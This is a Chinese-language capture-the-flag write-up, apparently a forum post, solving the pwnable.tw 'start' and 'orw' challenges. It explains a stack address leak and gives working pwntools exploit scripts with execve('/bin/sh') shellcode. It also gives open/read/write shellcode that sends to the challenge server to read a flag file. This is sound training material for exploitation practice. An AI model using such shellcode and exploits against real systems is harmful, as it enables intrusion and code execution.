### `ida`

![img](https://bbs.kanxue.com/upload/attach/202204/943085_726R54JVAEEN8EQ.jpg)

发现是 32 位的两个系统调用，先 `write` 然后 `read`，而且 `write` 的是 `esp` 指向的栈上的内容。

最后 `retn`，即 `pop eip`、`jmp`。

首先明确，写只能往栈上写。如果想调用 `shellcode`，那么我们需要劫持 `retn` 的地址为栈上存放 `shellcode` 的地址。那么就需要泄露栈地址，即把 `esp` 存放的位置想办法指向栈上的位置，然后 `write esp`。

我们看看正常执行流碰到 `retn` 后栈上的分布，就会发现一件很巧的事情。

![img](https://bbs.kanxue.com/upload/attach/202204/943085_K4WSNKEKQB6HGNJ.jpg)

`ret` 之后，`esp` 就滑向了 `0xdc -> 0xe0`。如果我们 `ret` 到 `write` 的系统调用，不就正好可以打印栈上地址了么？

栈布局啥的就不说了，自己调调就能出。

就说说 `shellcode`：

```python
### execve('/bin/sh',0,0)
shellcode='''
xor ecx,ecx;
xor edx,edx;
push 0x0068732f;
push 0x6e69622f;
mov ebx,esp;
mov eax,0xb;
int 0x80;
'''
```

`push` 的两个字符应该按照 `/bin/sh` 的小端字序，即 `\x00hs/` 和 `nib/` 转 16 进制。

### `exp`

```python
from pwn import *
context.log_level='debug'
r=process('./start')
gdb.attach(r)
r.sendafter('CTF:','a'*0x14+p32(0x8048087))
stack=u32(r.recv(4))
log.success('stack:'+hex(stack))
### execve('/bin/sh',0,0)
shellcode='''
xor edx,edx;
xor ecx,ecx;
push 0x0068732f;
push 0x6e69622f;
mov ebx,esp;
mov eax,0xb;
int 0x80;
'''
payload='a'*0x14+p32(stack+0x14)+asm(shellcode)
r.send(payload)
r.interactive()
```

![img](https://bbs.kanxue.com/upload/attach/202204/943085_VKHKF3YU5ADBM82.jpg)

发现没有允许 `execve` 的系统调用，题目也给了一个文件的目录（`hgame` 貌似用的是相对目录，但是前提是当前目录有 `flag` 文件），考虑 `orw`。

### `exp`

```python
from pwn import *
##context.log_level='debug'
r=remote('chall.pwnable.tw',10001)
### open('/home/orw/flag',0)
s_open='''
xor ecx,ecx;
mov ebx,0x0804A085;
mov eax,5;
int 0x80
'''
### read(3,0x0804A085,0x40)
s_read='''
mov ecx,ebx;
mov edx,0x40
mov ebx,eax;
int 0x80
'''
### write(1,0x0804A085,0x40)
s_write='''
mov ebx,1;
mov eax,4;
int 0x80;
'''
shellcode=s_open+s_read+s_write
payload=asm(shellcode)+'/home/orw/flag\x00\x00'
##gdb.attach(r)
r.sendafter("Give my your shellcode:",payload)
st=r.recv()
print(st)
r.interactive()
```
